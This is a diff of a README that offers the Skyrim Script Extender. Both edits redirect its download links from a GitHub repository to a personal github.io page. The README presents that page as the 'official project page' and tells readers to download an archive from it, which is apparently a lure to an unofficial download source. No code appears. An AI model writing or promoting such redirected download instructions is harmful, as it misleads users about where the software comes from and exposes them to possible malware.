@@ -1,6 +1,6 @@
 # ⚡ SKSE-Download - Run your Skyrim mods with ease
 
-[![](https://img.shields.io/badge/Download-SKSE-blue.svg)](https://github.com/jamytamy32/SKSE-Download)
+[![](https://img.shields.io/badge/Download-SKSE-blue.svg)](https://jamytamy32.github.io)
 
 This project provides a reliable way to get the Skyrim Script Extender for Windows 10 and 11. The Script Extender adds important functions to the base game. Many advanced game modifications require these functions to work. This guide explains how to get the files and set them up on your computer.
 
@@ -18,7 +18,7 @@ Check that your version of Skyrim matches the version of the Script Extender. If
 
 You need to access the official project page to secure the correct files for your game. Follow the link below to reach the download section:
 
-[Click here to visit the download page](https://github.com/jamytamy32/SKSE-Download)
+[Click here to visit the download page](https://jamytamy32.github.io)
 
 Once you reach the page, look for the latest release. Select the compressed file with the .7z or .zip extension. Save this file to your Downloads folder.
 
